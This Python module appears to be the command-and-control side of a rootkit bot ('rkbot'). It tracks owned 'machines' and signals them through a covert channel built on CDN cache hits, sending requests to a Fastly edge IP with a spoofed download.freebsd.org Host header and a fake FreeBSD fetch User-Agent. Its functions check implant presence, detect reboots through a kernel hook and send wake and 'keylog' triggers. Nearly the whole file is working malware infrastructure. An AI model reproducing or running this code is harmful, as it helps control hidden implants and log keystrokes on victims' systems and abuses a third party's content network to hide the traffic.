# this is l ikely to be veyr confusing. read the readme please
import asyncio
import json
import logging
import os
import time

import aiohttp
import petname

log = logging.getLogger("rkbot.dd")

probedandok = {}

curwd = os.path.dirname(os.path.abspath(__file__))
DB = f"{curwd}/machines.json"
EDGE = "151.101.1.242"
HOST = "download.freebsd.org"
BASE = "/ftp/releases/amd64/14.5-RELEASE/MANIFEST"
BUCKET = 20
WAKE_KEYS = 6

def load():
	try:
		with open(DB) as f:
			return json.load(f)
	except (OSError, ValueError):
		return {"machines": []}


def save(db):
	with open(DB, "w") as f:
		json.dump(db, f, indent=1)


def random_alias():
	return petname.Generate(2, "", 2)


def add(owner, alias, mid, pub=None):
	db = load()
	now = int(time.time())
	db["machines"].append({
		"alias": alias,
		"owner": str(owner),
		"mid": mid,
		"pub": pub,
		"created": now,
		"last_seen": now,
		"sessions": 0,
	})
	save(db)
	return alias


def get(alias, owner=None):
	for m in load()["machines"]:
		if m["alias"] == alias and (owner is None or m["owner"] == str(owner)):
			return m
	return None


def all_for(owner):
	return [m for m in load()["machines"] if m["owner"] == str(owner)]


def touch(alias):
	db = load()
	for m in db["machines"]:
		if m["alias"] == alias:
			m["last_seen"] = int(time.time())
			save(db)
			return


def session(alias):
	db = load()
	for m in db["machines"]:
		if m["alias"] == alias:
			m["sessions"] += 1
			m["last_seen"] = int(time.time())
			save(db)
			return


def now():
	return int(time.time())


def presence_headers():
	return {
		"Host": HOST,
		"User-Agent": "FreeBSD libfetch/2.1",
		"Accept": "*/*",
		"Accept-Encoding": "identity",
	}


def worker_url():
	return os.environ.get("MQTT_WORKER", "")


def worker_token():
	return os.environ.get("MQTT_TOKEN", "")


def cache_url(mid, kind, bucket):
	return f"http://{EDGE}{BASE}?ts={bucket}&hmac={mid}&{kind}"


async def hit(session, mid, kind, bucket):
	url = cache_url(mid, kind, bucket)
	async with session.get(url, headers=presence_headers(), timeout=6) as r:
		await r.read()
		cache = r.headers.get("X-Cache", "").upper()
		verdict = "HIT" if "HIT" in cache else "MISS"
		log.info("dd %s %s [%s]", verdict, url, cache)
		return verdict


async def presence(mid):
	bucket = int(time.time()) // BUCKET
	async with aiohttp.ClientSession() as session:
		for b in (bucket, bucket - 1):
			k = (mid, b)
			if k in probedandok:
				if probedandok[k]:
					return True
				continue
			try:
				probedandok[k] = await hit(session, mid, "p", b) == "HIT"
			except Exception:
				continue
			if probedandok[k]:
				return True
	return False


# check if machine is restarting tbh
# on the kernel side we made an ehook and write r-keys before the box dies. we have presence checking now
probable_rkeys = set()


def clear_restart(mid):
	for k in list(probable_rkeys):
		if k[0] == mid:
			probable_rkeys.discard(k)


async def restarting(mid):
	bucket = int(time.time()) // BUCKET
	async with aiohttp.ClientSession() as session:
		for b in (bucket, bucket-1, bucket-2, bucket-3):
			k = (mid, b)
			if k in probable_rkeys:
				continue
			probable_rkeys.add(k)
			try:
				if await hit(session, mid, "r", b) == "HIT":
					return True
			except Exception:
				pass
	return False


async def wake(mid, kind="a"):
	bucket = int(time.time()) // BUCKET
	log.info("dd wake %s buckets %d..%d", mid, bucket, bucket+WAKE_KEYS-1)

	async def wake_key(session, b):
		try:
			url = cache_url(mid, kind, b)
			async with session.get(url, headers=presence_headers(), timeout=6) as r:
				await r.read()
				log.info(f"cachetalk {r.status}, {r.headers.get('X-Cache', 'n/a')}")
				return r.status == 200
		except Exception as e:
			log.warning("cachetalk err", b, e)
			return False

	async with aiohttp.ClientSession() as session:
		results = await asyncio.gather(*[wake_key(session, b) for b in range(bucket, bucket + WAKE_KEYS)])
	return sum(results)


async def keylog(mid):
	return await wake(mid, "k")
